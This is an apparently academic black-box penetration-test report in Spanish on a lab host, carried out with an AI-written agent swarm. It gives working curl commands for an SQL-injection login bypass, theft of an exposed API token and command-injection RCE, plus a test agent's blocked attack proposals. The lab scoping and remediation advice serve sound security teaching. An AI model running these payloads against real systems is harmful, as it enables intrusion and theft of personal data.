# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** 03
**Integrantes:**

| Nombre y apellido | Legajo | Usuario de GitHub |
|---|---|---|
| Federico Sánchez | `13614` | @Fedesan14 |
| Elian Enria | `13245` | @elian-enria-id |
| Efraín Host | `18273` | @hostefrain |
| Lohana Rumis | `14646` | @Lohana-Rumis |

**Fecha:** 2026-11-20  ·  **Tipo:** Caja negra  ·  **Alcance:** host `phantomcorp` (lab)

> La auditoría se hizo con un swarm de agentes propio (PTaaS), en
> `entregas/labfinal/grupo03/ptaas/`. Cada acción pasó por la Rules of Engagement,
> se ejecutó en un contenedor efímero sin privilegios y quedó en una bitácora
> encadenada con HMAC. La corrida de referencia es `loot/corrida-20261120-163916.jsonl`,
> incluida en este entregable.

---

## 0. Declaración de uso de IA

**Herramienta:** Claude (asistente de IA de Anthropic, modelo Opus), usado desde Claude Code y GitHub Copilot con modelo Claude Sonnet 5 

**Para qué se usó:**
- Diseño y escritura de los agentes de explotación del swarm (R2 a R4): `AgenteFoothold`,
  `AgenteLoot` y `AgenteImpacto` en `ptaas/agentes.py`, revisión y ayuda en resolución de problemas.
- Diseño del **catálogo de PoC** y las dos herramientas nuevas de la RoE (`curl_post`,
  `curl_api`) en `ptaas/roe.py`, con la validación que las acota.
- Ampliación de `ptaas/test_ptaas.py` (cadena completa determinista y rechazo de PoC
  fuera del catálogo) y de la capa de presentación del panel (`ptaas/panel.html`).
- Redacción de este informe a partir de la evidencia de la bitácora.

**Qué partes afectó:** el código de los agentes R2–R4, el catálogo y las herramientas
de la RoE, los tests nuevos, el panel y la prosa del informe. El recon/enumeración (R1),
la arquitectura base del swarm (orquestador, bitácora, sandbox, RoE) y la decisión de
alcance ya eran del grupo.

**Cómo se verificó lo que devolvió:**
- `python3 test_ptaas.py` pasa, incluida la verificación cruzada de la cadena HMAC con
  `openssl` (fuente independiente del propio código).
- La cadena se corrió de verdad contra el lab en Docker. Cada hallazgo de este informe
  tiene el comando exacto y la salida cruda que quedaron en la bitácora (anexo B), no una
  afirmación de la IA.
- Las cuatro flags se leyeron de las respuestas HTTP reales del target, no se escribieron
  a mano en ningún lado del código.
- Se hicieron dos corridas: las decisiones (los `argv`) fueron idénticas (determinismo),
  y la bitácora de cada una verifica con `bitacora.py`.

---

## 1. Resumen ejecutivo

Se auditó, sin credenciales ni documentación, el sistema **Clientes** de PhantomCorp.
El sistema **se comprometió por completo**: se llegó desde "no tener nada" hasta leer la
base de datos de clientes (48.210 registros con nombre, DNI y número de tarjeta) y a poder
ejecutar comandos arbitrarios en el servidor.

- **Qué se hizo:** una auditoría de caja negra del portal de Clientes, encadenando
  reconocimiento, explotación, post-explotación e impacto.
- **Resultado global:** compromiso total. Se alcanzaron los cuatro hitos (R1 a R4).
- **Riesgo de negocio:** quedó expuesta toda la base de clientes (datos personales y
  financieros: **DNI y tarjetas**) y el servidor quedó bajo control del atacante. Es una
  fuga masiva de datos personales con implicancias legales (protección de datos) y
  reputacionales, más el riesgo de que el servidor se use como pivote.
- **Recomendación prioritaria:** eliminar la ejecución de comandos del endpoint
  `/api/reporte` (hallazgo H-03), que es lo que convierte una fuga de datos en un control
  total del servidor. En paralelo, parametrizar el login (H-01) y sacar el archivo de
  configuración de la web (H-02).

| Severidad | Cantidad de hallazgos |
|---|---|
| Crítica | 2 |
| Alta | 1 |
| Media | 0 |
| Baja | 0 |

---

## 2. Alcance y metodología

**Alcance:** únicamente el host `phantomcorp` del laboratorio (resuelto a `172.19.0.2` en
la red `cyberlab_labnet`).

**Fuera de alcance:** cualquier otro host. La Rules of Engagement (`ptaas/roe.py`) sólo
autoriza el host `phantomcorp`; un intento del swarm contra otra IP se rechaza antes de
ejecutarse (ver el agente pícaro y el anexo D).

**Reglas del engagement:** sin acciones destructivas y sin denegación de servicio. La única
acción con potencial de escritura (la RCE de H-03) se usó en modo **inerte**: sólo para
**leer** el archivo de clientes y demostrar el impacto, nunca para modificar ni borrar.

**Marco seguido:** reconocimiento → enumeración → explotación → post-explotación → impacto,
ejecutado como una cadena de cuatro hitos donde cada uno habilita el siguiente.

**Cómo se ejecutó cada acción:** un agente nunca arma un comando ni elige un payload libre.
Propone una `Accion` con campos acotados; para explotar (R2 y R4) elige una verificación de
un **catálogo curado** (`roe.CATALOGO`), nunca un string arbitrario. El orquestador valida
contra la RoE, registra y recién ahí ejecuta, en un contenedor Docker **efímero, sin
privilegios (`--cap-drop ALL`, `no-new-privileges`), de solo lectura y con límites de CPU,
memoria y PIDs**. El contenedor se descarta al terminar.

**Trazabilidad:** cada propuesta y cada resultado quedan en una bitácora `jsonl` donde cada
línea lleva el HMAC-SHA256 de la anterior. Alterar una línea del medio rompe la cadena en la
siguiente; truncar o alterar el final se detecta contra la **cabeza publicada** (anexo A).
La clave vive fuera del repositorio.

---

## 3. Narrativa del ataque

```
recon/enum  ->  R1 portal oculto  ->  R2 SQLi (foothold)  ->  R3 loot del token  ->  R4 RCE / datos de clientes
```

**R1 — Reconocimiento y enumeración.** El agente Recon escaneó los 100 puertos más comunes
y encontró sólo el **80/tcp** abierto, con un servicio web que nmap no identificó
(`Server: PhantomClientes/2.0`). El agente Enum leyó `/robots.txt`, que contiene
`Disallow: /portal-rrhh`: una ruta que el sitio le pide a los buscadores que no indexen,
pero que no está enlazada en ninguna página. Enum la probó junto con una lista fija de
rutas; sólo `/portal-rrhh` respondió **200**. Al leer esa página apareció un formulario de
login ("Portal interno RRHH") y, en un comentario HTML, la flag `FLAG{final_recon_portal}`.

**R2 — Explotación (foothold).** El agente Foothold leyó el formulario y extrajo su destino
(`action=/portal/login`). Sobre ese endpoint disparó la verificación `sqli-bypass-login` del
catálogo: un POST con el usuario `admin'-- -`. El backend arma la consulta por concatenación
de strings, así que la comilla cierra el literal y el `--` comenta el resto del `WHERE`; el
login devolvió la fila de `admin` **sin una contraseña válida**. La respuesta dio
`FLAG{final_sqli_foothold}` y, además, reveló una ruta sensible:
`Backup de config disponible en: /backup/rrhh.conf`.

**R3 — Post-explotación (loot).** El agente Loot pidió esa ruta. El servidor devolvió el
archivo de configuración en texto plano, con las credenciales de la base
(`DB_USER=rrhh_app`, `DB_PASS=Rh-2026`) y, sobre todo, un **token de API**:
`API_TOKEN=phantom-api-7c1e`, junto con `FLAG{final_token_looted}`. El propio archivo
documentaba cómo usar el token: `/api/reporte?token=...&cmd=...`.

**R4 — Impacto.** Con el token looteado, el agente Impacto disparó la verificación
`rce-leer-joyas` contra `/api/reporte`: el endpoint pasa el parámetro `cmd` directo a
`os.popen`, así que ejecuta comandos del sistema. Se usó de forma inerte, para **leer** el
archivo de clientes: `cat /app/priv/clientes.db.txt`. La respuesta confirmó el acceso a las
**crown jewels**: `clientes: 48210 registros (nombre, DNI, tarjeta)` y
`FLAG{final_crown_jewels}`. El mismo endpoint permite ejecutar **cualquier** comando, de modo
que el compromiso no se limita a leer: es control del servidor.

---

## 4. Hallazgos (detalle técnico)

> Ordenados por severidad, críticos primero.

### H-01 · Inyección SQL en el login del portal RRHH (evasión de autenticación)
- **Severidad:** Crítica · **CVSS:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
  *(red, sin privilegios ni interacción; evade la decisión de autenticación y entrega sesión
  admin —integridad del control de acceso— y permite leer la tabla `users` —confidencialidad—;
  sin impacto de disponibilidad.)*
- **Ubicación:** `POST /portal/login`, parámetro `user` (también `pass`).
- **Descripción:** la consulta se arma concatenando la entrada del usuario:
  `SELECT user, rol FROM users WHERE user='{user}' AND pass='{pw}'`. Un `'` en `user` rompe
  la sintaxis y `-- ` comenta el chequeo de contraseña, devolviendo la fila de `admin`.
- **Evidencia (reproducible):**
  ```bash
  curl -s --data "user=admin'-- -&pass=x" http://phantomcorp:80/portal/login
  # Bienvenido admin. Dashboard RRHH.
  # FLAG{final_sqli_foothold}
  # Backup de config disponible en: /backup/rrhh.conf
  ```
- **Impacto:** acceso al panel de RRHH como administrador sin credenciales, y lectura de la
  tabla de usuarios. Es el primer eslabón: desde el dashboard se descubre H-02.
- **Remediación:** **consultas parametrizadas** (placeholders), nunca concatenación:
  `DB.execute("SELECT user, rol FROM users WHERE user=? AND pass=?", (user, pw))`. Además,
  no comparar la contraseña en texto plano: almacenar un hash con sal (p. ej. `scrypt` de la
  stdlib) y verificar en tiempo constante. Validar que `rol` venga de la fila, no de la entrada.

### H-02 · Archivo de configuración con secretos accesible sin autenticación
- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
  *(exposición de información sensible accesible por red, sin privilegios; alto impacto de
  confidencialidad —token de API y credenciales de base—, sin impacto directo de I/A.)*
- **Ubicación:** `GET /backup/rrhh.conf`.
- **Descripción:** el servidor sirve un archivo de configuración en texto plano desde la web,
  **sin ningún control de acceso**. No hace falta el foothold de H-01: cualquiera que conozca
  o adivine la ruta lo descarga. Contiene credenciales de base y el token que gatea la RCE.
- **Evidencia (reproducible):**
  ```bash
  curl -s http://phantomcorp:80/backup/rrhh.conf
  # DB_USER=rrhh_app
  # DB_PASS=Rh-2026
  # API_TOKEN=phantom-api-7c1e
  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
  ```
- **Impacto:** fuga del token de API (habilita H-03) y de las credenciales de la base. Es un
  camino **independiente** a las crown jewels: convierte la cadena en explotable aun sin el SQLi.
- **Remediación:** no servir backups ni archivos de configuración desde la raíz web; moverlos
  fuera del *docroot* y restringir por permisos de archivo. Tratar el token y las credenciales
  expuestas como **comprometidos**: rotarlos. No usar una contraseña débil como `Rh-2026`; no
  versionar secretos; gestionarlos con variables de entorno o un secret manager.

### H-03 · Inyección de comandos (RCE) en el endpoint de reportes
- **Severidad:** Crítica · **CVSS:** 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  *(RCE por red, sin interacción; el único "gate" es un token que H-02 filtra sin
  autenticación, por lo que no es una barrera real de privilegio; ejecución arbitraria de
  comandos → impacto total de confidencialidad, integridad y disponibilidad.)*
- **Ubicación:** `GET /api/reporte`, parámetro `cmd` (gateado por `token`).
- **Descripción:** el endpoint pasa `cmd` directo a `os.popen(cmd)`. Con el token looteado en
  H-02, se ejecuta cualquier comando del sistema. Se usó de forma inerte (solo lectura).
- **Evidencia (reproducible):**
  ```bash
  curl -s -G http://phantomcorp:80/api/reporte \
    --data-urlencode "token=phantom-api-7c1e" \
    --data-urlencode "cmd=cat /app/priv/clientes.db.txt"
  # $ cat /app/priv/clientes.db.txt
  # clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
  ```
- **Impacto:** lectura de la base de clientes (48.210 registros con **DNI y tarjetas**) y, en
  general, **ejecución de comandos arbitrarios** en el servidor: control total del host dentro
  del contenedor y posible pivote.
- **Remediación:** **eliminar la ejecución de comandos**. Un endpoint de reportes no debe
  invocar el shell: reemplazar `os.popen(cmd)` por una operación fija y acotada (una lista
  blanca de reportes predefinidos, sin entrada del usuario en el comando). No depender de un
  token compartido como control de autorización; usar autenticación real y principio de
  mínimo privilegio para el proceso del servidor.

---

## 5. Conclusión

El sistema Clientes cayó por completo y la cadena **era evitable en cada eslabón**. Lo más
grave no es que exista una vulnerabilidad, sino que haya **dos caminos independientes** a las
crown jewels: el previsto (SQLi → dashboard → backup → RCE) y uno más corto, porque
`/backup/rrhh.conf` (H-02) está accesible **sin autenticación**, así que el token que habilita
la RCE se filtra aun sin resolver el SQLi.

Por eso no alcanza con tapar un solo agujero: es un problema de **defensa en profundidad**.
Si hubiera que elegir el arreglo de mayor impacto, es **H-03**: mientras `/api/reporte` ejecute
comandos del sistema, cualquier filtración de un secreto se transforma en control total del
servidor. Quitar esa ejecución degrada el peor escenario (RCE) a, en el peor caso, una fuga de
datos —grave, pero acotada—. El eslabón que, parametrizado, habría cortado el camino *previsto*
en R2 es H-01; pero sólo arreglando H-01, H-02 y H-03 juntos se corta la cadena de raíz.

---

## 6. Anexo

### A. Corrida de referencia

- **Archivo:** `loot/corrida-20261120-163916.jsonl` (28 líneas, incluido en este entregable;
  también quedan `loot/ctf-status-final.txt` y `loot/orquestador-salida.txt`).
- **Cabeza de la bitácora:** `2c93840ca01edec9ce51554f9f88f4f439b243197a21b95c8fca5c916aa85b88`
  (verificada con `python3 ptaas/bitacora.py <archivo>` y, de forma independiente, recalculando
  la cadena línea a línea con `openssl dgst -sha256 -hmac`: coincide dígito a dígito. La clave
  de esa corrida se generó al momento y no se versiona).
- **Determinismo:** se corrió dos veces contra el mismo `phantomcorp`; las 14 acciones
  propuestas (`argv`) fueron **idénticas** entre ambas corridas, byte a byte. La cabeza de la
  bitácora difiere entre corridas porque la salida de `nmap` incluye la fecha y porque cada
  corrida usa una clave HMAC distinta; lo determinista son las decisiones del swarm, no el
  hash final.

### B. Comandos ejecutados (una línea por hito)

```bash
# R1 — recon + enum
nmap -sT -sV --version-light -Pn --top-ports 100 phantomcorp
curl -s --max-filesize 65536 http://phantomcorp:80/robots.txt        # Disallow: /portal-rrhh
curl -s --max-filesize 65536 http://phantomcorp:80/portal-rrhh       # FLAG{final_recon_portal}

# R2 — foothold por SQLi
curl -s --data "user=admin'-- -&pass=x" http://phantomcorp:80/portal/login   # FLAG{final_sqli_foothold}

# R3 — loot del token
curl -s --max-filesize 65536 http://phantomcorp:80/backup/rrhh.conf  # API_TOKEN=... FLAG{final_token_looted}

# R4 — impacto (RCE, uso inerte: solo lectura)
curl -s -G http://phantomcorp:80/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=cat /app/priv/clientes.db.txt"               # FLAG{final_crown_jewels}
```

### C. Estado de los hitos

Las cuatro flags se leyeron de las respuestas HTTP reales del target durante la corrida de
referencia y se entregaron con `./ctf submit final R1..R4`. Salida real de
`./ctf status final` (también en `loot/ctf-status-final.txt`):

```
   ✓  R1     Recon/enum: portal interno localizado
   ✓  R2     Explotacion: foothold por SQLi
   ✓  R3     Post: token de API looteado
   ✓  R4     Impacto: crown jewels (datos de clientes)

  ██████████████████████████████  4/4 (100%)

[ OK ] ¡Lab final COMPLETO!
```

> En Windows no hay `make` ni el contenedor `attacker` del `./ctf`, así que la corrida del
> swarm se hace con `docker compose` directo (ver `PRUEBAS.md`, parte D); el envío de las
> flags y la captura de este estado sí se hicieron con `./ctf`. Las flags son la evidencia de
> que cada hito se alcanzó; la bitácora las respalda línea por línea.

### D. La RoE en acción

El agente pícaro (`AgentePicaro`, usado por el test y por el panel) propone cuatro acciones
prohibidas —atacar `8.8.8.8`, colar un comando en la ruta, usar `bash`, usar un puerto
inválido— y las cuatro quedan **rechazadas** antes de ejecutarse. Además, el test comprueba
que un agente no puede disparar un PoC fuera del catálogo ni cruzar un PoC con otra
herramienta: la explotación sólo pasa por verificaciones curadas y revisadas.
